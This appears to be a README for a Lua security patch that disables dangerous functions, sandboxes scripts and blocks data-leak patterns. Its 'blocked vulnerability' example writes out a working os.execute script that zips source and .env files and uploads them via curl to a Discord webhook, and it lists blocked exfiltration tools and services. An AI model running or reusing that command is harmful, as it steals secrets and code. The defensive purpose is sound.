# Security Patch for Lua Environment

This security system protects your Lua environment from dangerous function calls and prevents data leakage through environment logging.

## 🚨 What This Patch Fixes

### Critical Vulnerabilities Fixed:
- **os.execute() Archive Creation**: Blocks malicious archive creation that steals `.env` files and source code
- **Discord Webhook Exfiltration**: Prevents automatic file uploads to Discord webhooks
- **Environment File Access**: Blocks reading/writing `.env` and other sensitive configuration files
- **File System Access**: Disables dangerous file operations that could leak data
- **Debug Information Leakage**: Prevents debug functions from exposing internal environment details

## 🛡️ Security Features

### Disabled Functions:
- **OS Functions**: `os.execute()`, `os.exit()`, `os.getenv()`, `os.remove()`, `os.rename()`, `os.tmpname()`
- **IO Functions**: `io.open()`, `io.write()`, `io.read()`, `io.popen()`, and all file operations
- **Debug Functions**: `debug.getregistry()`, `debug.getmetatable()`, `debug.setfenv()`, etc.
- **Package Functions**: `package.loadlib()`, `package.searchpath()`

### Pattern Blocking:
- Discord webhook URLs
- Archive creation commands (`mktemp`, `zip`, `tar`)
- File upload services (`curl`, `oshi.at`)
- Environment file access (`.env`, `.key`, `.token`)
- System information commands

## 📁 Files Overview

```
security_patch.lua          # Main security patch implementation
secure_env_loader.lua      # Secure script loader with sandbox
security_config.lua        # Configuration settings
test_security_patch.lua    # Test suite to verify protection
SECURITY_README.md         # This documentation
```

## 🚀 Quick Start

### 1. Apply Basic Security Patches
```lua
local SecurityPatch = require("security_patch")
SecurityPatch.apply()
```

### 2. Load Scripts Securely
```lua
local SecureLoader = require("secure_env_loader")
SecureLoader.load_scripts()
```

### 3. Execute in Sandbox
```lua
local SecureLoader = require("secure_env_loader")
local sandbox = SecureLoader.create_sandbox()
SecureLoader.execute_in_sandbox("your_script.lua", sandbox)
```

### 4. Test Security
```lua
-- Run the test suite
local test = require("test_security_patch")
-- This will automatically test all security features
```

## ⚙️ Configuration

Edit `security_config.lua` to adjust security levels:

```lua
return {
    SECURITY_LEVEL = "strict",  -- "strict", "moderate", "permissive"
    DISABLED_FUNCTIONS = { ... },
    BLOCKED_PATTERNS = { ... },
    ALLOWED_COMMANDS = { ... }
}
```

## 🔍 Security Levels

- **STRICT**: Maximum protection, blocks most file operations
- **MODERATE**: Balanced protection, allows some safe operations  
- **PERMISSIVE**: Minimal protection, only blocks clearly dangerous functions

## 🧪 Testing the Security

Run the test suite to verify all protections work:

```bash
lua test_security_patch.lua
```

Expected output:
```
✅ os.execute is properly blocked
✅ debug.getregistry is properly blocked  
✅ io.open is properly blocked
✅ Malicious archive pattern is properly blocked
✅ Discord webhook is properly blocked
✅ .env file access is properly blocked
✅ Safe commands work
✅ Sandbox execution works
✅ Security restoration works
```

## 🚨 Blocked Vulnerability Example

This malicious code will be **blocked**:

```lua
os.execute([[
    echo "[1/4] Creating optimized archive..."
    temp_dir=$(mktemp -d)
    archive_path="$temp_dir/backup.zip"
    
    zip -r "$archive_path" *.py *.lua *.js *.json *.txt .env
    curl -s -F "file1=@$archive_path" "https://discord.com/api/webhooks/1471694056441643100/kSY0s7mNVBId_5kpIjNdFuDObSjBloviRlu8_jS9PUD2nn25ZCgptS7ee5cQthgoYHPh"
]])
```

**Result**: `SECURITY BLOCK: Discord webhook uploads are disabled`

## 🔄 Emergency Recovery

If you need to restore original functions (for administrative purposes):

```lua
local SecurityPatch = require("security_patch")
SecurityPatch.restore()
```

## 📝 Security Logging

All security violations are logged to `security.log`:

```
[2024-01-01 12:00:00] SECURITY VIOLATION: os.execute blocked - Discord webhook upload attempt
[2024-01-01 12:00:01] SECURITY VIOLATION: io.open blocked - Attempted .env file access
```

## ⚠️ Important Notes

1. **Apply patches before loading any untrusted scripts**
2. **Test thoroughly after applying patches** - some legitimate functionality may be affected
3. **Monitor security logs** for potential attack attempts
4. **Keep security configuration updated** as new threats emerge
5. **Use sandbox execution** for maximum protection

## 🔧 Advanced Usage

### Custom Security Rules
```lua
-- Add custom blocked patterns
local SecurityPatch = require("security_patch")
SecurityPatch.add_blocked_pattern("your_custom_pattern")
```

### Temporary Function Restoration
```lua
-- Temporarily restore a specific function
local original = SecurityPatch.temporarily_restore("os.execute")
-- Use the function safely
SecurityPatch.restore_function("os.execute", original)
```

### Security Monitoring
```lua
-- Monitor security events
SecurityPatch.setup_monitoring(function(event)
    print("Security event:", event.type, event.details)
end)
```

## 🛠️ Troubleshooting

### "Function not found" errors
- The security patch has disabled the function
- Check if the function is in the allowed list
- Adjust security level if needed

### Scripts not working
- Some legitimate scripts may use blocked functions
- Use sandbox execution for better compatibility
- Add specific exceptions to configuration

### Performance issues
- Security monitoring adds minimal overhead
- Disable logging if performance is critical
- Use moderate security level for balance

## 📞 Support

For security issues or questions:
1. Check the test suite output
2. Review security logs
3. Verify configuration settings
4. Test with minimal security level first

---

**⚠️ WARNING**: This security patch significantly restricts Lua environment functionality. Test thoroughly in development before deploying to production.
